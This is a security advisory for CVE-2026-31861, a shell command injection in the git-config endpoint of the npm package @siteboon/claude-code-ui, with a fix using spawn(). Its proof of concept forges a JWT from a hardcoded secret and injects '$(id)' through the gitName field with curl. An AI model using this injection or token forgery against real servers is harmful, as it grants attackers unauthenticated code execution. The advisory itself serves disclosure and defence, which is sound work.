# [H] @siteboon/claude-code-ui is Vulnerable to Shell Command Injection in Git Routes

## Summary
Severity: High
Advisory: GHSA-7fv4-fmmc-86g2
CVE: CVE-2026-31861
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-7fv4-fmmc-86g2
Type: github-advisory

## Affected
- npm: `@siteboon/claude-code-ui` — affected >=0 <1.24.0

## Details
# Shell Command Injection in User Git Config Endpoint

| Field | Value |
|-------|-------|
| **Severity** | High |
| **CVSS 3.1** | 8.8 (High) — when chained with VULN-01 |
| **CWE** | CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') |
| **Attack Vector** | Network |
| **Authentication** | JWT required (bypassable via VULN-01) |
| **Affected Files** | `server/routes/user.js` (lines 58-59) |

## Description

The `/api/user/git-config` endpoint constructs shell commands by interpolating user-supplied `gitName` and `gitEmail` values into command strings passed to `child_process.exec()`. The input is placed within double quotes and only `"` is escaped, but backticks (`` ` ``), `$()` command substitution, and `\` sequences are all interpreted within double-quoted strings in bash.

This allows authenticated attackers to execute arbitrary OS commands via the git configuration endpoint.

## Root Cause

`server/routes/user.js` lines 58-59:

```javascript
await execAsync(`git config --global user.name "${gitName.replace(/"/g, '\\"')}"`);
await execAsync(`git config --global user.email "${gitEmail.replace(/"/g, '\\"')}"`);
```

Only `"` is escaped. However, within double-quoted bash strings, the following are still interpreted:

- `` `malicious_command` `` — backtick execution
- `$(malicious_command)` — subshell execution

## Impact

- **Remote Code Execution (RCE)** — arbitrary OS commands execute as the Node.js process user
- The `git config --global` vector modifies the **server-wide** git configuration, affecting all git operations
- When chained with VULN-01 (hardcoded JWT), this is fully **unauthenticated RCE**
- Attacker can: read/write any file, install backdoors, pivot to other systems, exfiltrate data

## Proof of Concept

```bash
# Step 1: Forge a JWT (see VULN-01)
TOKEN=$(python3 -c "import jwt; print(jwt.encode({'userId':1,'username':'admin'}, 'claude-ui-dev-secret-change-in-production', algorithm='HS256'))")

# Step 2: Inject via gitName using command substitution
curl -X POST "http://REDACTED:5173/api/user/git-config" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"gitName":"$(id)","gitEmail":"attacker@example.com"}'
```

The server executes:

```
git config --global user.name "$(id)"
```

Bash evaluates `$(id)` before passing it to git, executing the `id` command and setting the username to the output.

## Remediation

Replace `exec()` with `spawn()` (array arguments, no shell):

```javascript
// BEFORE (vulnerable):
await execAsync(`git config --global user.name "${gitName.replace(/"/g, '\\"')}"`);

// AFTER (safe):
await spawnAsync('git', ['config', '--global', 'user.name', gitName]);
await spawnAsync('git', ['config', '--global', 'user.email', gitEmail]);
```

## References
- https://github.com/siteboon/claudecodeui/security/advisories/GHSA-7fv4-fmmc-86g2
- https://nvd.nist.gov/vuln/detail/CVE-2026-31861
- https://github.com/siteboon/claudecodeui/commit/86c33c1c0cb34176725a38f46960213714fc3e04
- https://github.com/siteboon/claudecodeui
- https://github.com/siteboon/claudecodeui/releases/tag/v1.24.0
